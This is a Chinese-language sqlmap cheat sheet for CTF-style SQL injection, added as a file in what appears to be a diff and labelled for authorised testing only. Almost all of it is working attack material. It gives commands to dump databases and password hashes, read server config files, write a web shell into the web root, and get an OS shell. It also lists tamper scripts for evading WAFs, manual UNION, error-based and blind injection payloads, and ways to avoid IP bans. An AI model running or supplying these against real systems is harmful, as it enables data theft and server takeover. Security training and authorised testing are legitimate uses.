@@ -1,0 +1,83 @@
+==========================================================================
+ sqlmap 速查手册（CTF Web / SQL 注入）  仅用于授权测试与靶场
+==========================================================================
+
+【0x01 基础参数】
+  sqlmap -u "http://t/news.php?id=1"                 # GET 注入点检测
+  sqlmap -u "http://t/news.php?id=1" --batch         # 全程默认回车
+  -r req.txt        # 用 Burp 抓到的完整 HTTP 请求（POST/Cookie/Header 注入必备）
+  --data "id=1"     # POST 参数
+  --cookie "a=b*"   # 对 Cookie 注入，* 号可手动指定任意注入点
+  -p id             # 指定测试参数； --skip 排除参数
+  --level 1~5       # 测试面：>=2 测 Cookie，>=3 测 User-Agent/Referer，>=5 全量
+  --risk 1~3        # 风险等级（3 会用 OR 等可能改库的 payload）
+  --technique BEUSTQ  # B:布尔盲注 E:报错 U:联合 S:堆叠 T:时间盲注 Q:内联
+  --dbms mysql      # 指定数据库 mysql/mssql/oracle/postgresql/sqlite/...
+  --proxy http://127.0.0.1:8080   # 挂 Burp 观察 payload
+  --tamper=space2comment,between   # 绕 WAF 的 tamper 脚本组合
+
+【0x02 脱库流程（标准六步）】
+  --dbs                       # 1. 列数据库
+  --current-db                # 2. 当前数据库
+  -D dbname --tables          # 3. 列表
+  -D dbname -T users --columns# 4. 列字段
+  -D dbname -T users -C username,password --dump   # 5. 脱数据
+  --dump-all --exclude-sysdbs # 6. 脱全部业务库
+  --count                     # 只统计行数，数据量大时先看规模
+
+【0x03 高频技巧】
+  --is-dba / --users / --passwords   # 权限判断、列用户、脱哈希
+  --roles                # 数据库角色
+  --privileges           # 当前权限
+  --current-user
+  --sql-shell            # 给一个 SQL 交互 shell
+  --os-shell             # DBA + 特定条件直接拿系统 shell（MySQL 写文件）
+  --os-cmd="whoami"
+  --file-read "/var/www/html/config.php"     # 读文件
+  --file-write shell.php --file-dest "/var/www/html/s.php"  # 写文件
+  --eval="import hashlib;id=hashlib.md5(id.encode()).hexdigest()"  # 参数带签名时
+  --suffix="-- -" --prefix="')"               # 手工闭合时补前后缀
+  --string "登录成功" / --not-string "错误"    # 布尔盲注真假页面标志
+  --code 200 / --titles / --text-only         # 软 404、动态页面去噪
+  --delay 1 --timeout 10 --retries 3          # 限速防封
+  --threads 10            # 布尔/报错注入可多线程（时间盲注不要开）
+
+【0x04 常见绕过 tamper（按目标组合）】
+  space2comment  空格 -> /**/
+  space2dash / space2hash  空格 -> -- 或 # 注释
+  between        = -> BETWEEN、> -> GREATER THAN
+  charencode     URL 编码
+  chardoubleencode  双重 URL 编码
+  randomcase     关键字随机大小写 UnIoN
+  equaltolike    = -> LIKE
+  greatest       > -> GREATEST()
+  apostrophemask ' -> %EF%BC%87
+  例: --tamper=space2comment,randomcase,between
+
+【0x05 手工验证 payload（sqlmap 跑不动时）】
+  联合查询列数:  ORDER BY 5-- -      /   UNION SELECT 1,2,3,4,5-- -
+  MySQL 版本库名: UNION SELECT version(),database(),user()-- -
+  表: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables
+       WHERE table_schema=database()-- -
+  列: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns
+       WHERE table_name='users'-- -
+  报错: AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -
+        AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
+  布尔: AND ascii(substr((SELECT flag FROM f LIMIT 1),1,1))>100-- -
+  时间: AND IF(ascii(substr(database(),1,1))>100,sleep(3),0)-- -
+        ;WAITFOR DELAY '0:0:3'--          (MSSQL)
+        AND 1=(SELECT 1 FROM pg_sleep(3)) (PostgreSQL)
+  SQLite: 无 information_schema，查 sqlite_master：
+        UNION SELECT 1,sql,3 FROM sqlite_master-- -
+  堆叠注入(; )：可结合预处理/改表名/HANDLER：
+        ;SHOW TABLES;-- -
+        ;HANDLER `f` OPEN;HANDLER `f` READ FIRST;-- -
+
+【0x06 常见坑】
+  * 302/登录后页面：用 -r 带 Cookie，或 --cookie；注意 token 过期
+  * https 自签证书报错：加 --force-ssl 或忽略（sqlmap 默认不校验）
+  * 时间盲注误报：--technique=T 时增大 --time-sec（默认 5，网络抖动设 10）
+  * WAF 封 IP：--delay、--proxy 轮换、换 tamper，不要无脑 --risk 3
+  * 盲注慢：优先找报错/联合；布尔用 --threads；确认 --string 标志准确
+  * sqlmap 本身不是漏洞扫描器，注入点要先手工确认存在
+==========================================================================
